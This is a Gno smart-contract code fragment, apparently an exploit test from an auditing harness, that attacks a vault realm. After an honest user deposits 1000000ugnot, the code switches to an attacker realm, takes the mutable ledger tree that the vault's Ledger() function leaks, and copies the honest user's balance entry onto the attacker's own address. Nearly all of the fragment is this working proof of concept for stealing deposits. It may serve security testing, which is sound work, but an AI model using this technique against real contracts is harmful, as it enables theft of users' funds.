	// Setup: an honest user called Deposit(), paying 1000000ugnot.
	honest := bouncerchain.PackageAddress("gno.land/r/bouncer/honest_user")
	bouncertesting.IssueCoins(bouncerchain.PackageAddress("gno.land/r/g19wmd95cwm3s0w0c5592tgu3zh4zgrtlggvugnj/vault/v1"), bouncerchain.Coins{bouncerchain.NewCoin("ugnot", 1000000)})
	bouncertesting.SetOriginSend(bouncerchain.Coins{bouncerchain.NewCoin("ugnot", 1000000)})
	bouncertesting.SetRealm(bouncertesting.NewUserRealm(honest))
	victim.Deposit(cross(cur))
	bouncertesting.SetOriginSend(bouncerchain.Coins{})
	bouncertesting.SetRealm(bouncertesting.NewCodeRealm("gno.land/r/bouncer/attacker"))
	println(victim.Render(""))
	done := false
	for _, arg := range []int{0} {
		_ = arg
		leaked := victim.Ledger()
		if leaked != nil {
			t := leaked
			v := t.Get(string(honest))
			if v == nil && t.Size() > 0 {
				_, v = t.GetByIndex(0)
			}
			if v == nil {
				panic("bouncer: tree is empty, nothing to copy")
			}
			t.Set(string(cur.Address()), v)
			done = true
			again := victim.Ledger()
			t = again
		}
		if done {
			break
		}
	}
	if !done {
		panic("bouncer: Ledger returned no non-nil pointer for any candidate argument")
	}
	println(victim.Render(""))
}

